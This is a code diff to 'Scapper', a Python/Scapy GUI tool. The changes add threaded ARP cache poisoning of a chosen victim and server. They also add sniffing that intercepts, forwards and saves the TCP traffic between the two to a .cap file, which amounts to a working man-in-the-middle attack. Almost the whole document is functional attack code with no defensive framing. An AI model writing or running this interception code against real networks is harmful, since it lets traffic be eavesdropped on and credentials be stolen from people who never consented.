@@ -1,6 +1,7 @@
 from scapy.all import *
 from Tkinter import *
 import threading
+import datetime
 import time
 
 def GetMacFromIp(targetip):
@@ -25,9 +26,21 @@ class Application(Frame):
         self.master.title("Scapper")
         self.grid()
 
+        # predefine threads
+        self.poison_t = threading.Thread(target = self.arp_poison)
+        self.poison_t.daemon = True
+        self.poison_t.killed = False
+
+        self.capture_t = threading.Thread(target = self.capture_packets)
+        self.capture_t.daemon = True
+        self.capture_t.killed = False
+        
         # Create interface
         self.arp = Button(self, text = "ARP Poisoning", command = self.startArp)
-        self.arp.grid(row = 20, column = 1)
+        self.arp.grid(row = 20, column = 0)
+
+        self.stoparp = Button(self, text = "Stop poisoning", command = self.stopArp)
+        self.stoparp.grid(row = 22, column = 0)
 
         #self.dns = Button(self, text = "DNS Spoofing") # command = self.start dns
         #self.dns.grid(row = 8, column = 4)
@@ -66,15 +79,21 @@ class Application(Frame):
         self.serverMac = GetMacFromIp(self.serverIp)
 
         # start a sepparate thread for continously poisoning the targets
-        poison_t = threading.Thread(target = self.arp_poison)
-        poison_t.daemon = True
-        poison_t.start()
+        self.poison_t.start()
 
         # start capturing thread
-        #capture_t = threading.Thread(target = self.capture_packets)
-        
+        self.capture_t.start()
+
+    def stopArp(self):
+        self.poison_t.killed = True
+        self.capture_t.killed = True
+     
     def arp_poison(self):
         while True:
+            if self.poison_t.killed == True:
+                self.poison_t.killed = False
+                print "[ARP] Stopping poisoning thread... [1/2]"
+                raise SystemExit()
             if self.victimIp == self.serverIp:
                 print "Error in Scapper/poison_t: Match between server and victim IP."
                 return
@@ -88,9 +107,35 @@ class Application(Frame):
                 print "[ARP] Poisoning ARP cache of: " + str([self.victimIp, self.serverIp])
             time.sleep(10)
 
-    
+    def interceptAndForward(self, packet):
+        # define custom action for sniff
+        if self.capture_t.killed == True:
+            self.capture_t.killed = False
+            print "[ARP] Stopping capturing thread...[2/2]"
+            raise SystemExit()
+        self.interceptedPackets.append(packet);
+        print "[ARP] Cached 1 packet..."
+        if packet[IP].dst == self.serverIp:
+            packet[Ether].dst = self.serverMac
+        else:
+            packet[Ether].dst = self.victimMac
+        packet[Ether].src = self.selfMac
+        sendp(packet, verbose = False, iface = self.networkInterface)
+
+    def TCPFilter(self, packet):
+        if packet.haslayer(TCP) and packet[Ether].dst == self.selfMac and (packet[IP].dst == self.serverIp or packet[IP].dst == self.victimIp):
+            return True
+        return False
+
+    def capture_packets(self):
+        print "[ARP] Forwarding and saving TCP packets..."
+        sniff(lfilter = self.TCPFilter, prn = self.interceptAndForward, iface = self.networkInterface)
+        
     
     def exit(self):
+        if len(self.interceptedPackets) > 0:
+            wrpcap("packets-" + str(datetime.datetime.now()) + ".cap", self.interceptedPackets)
+            print ".cap file saved."
         root.destroy()
 
         
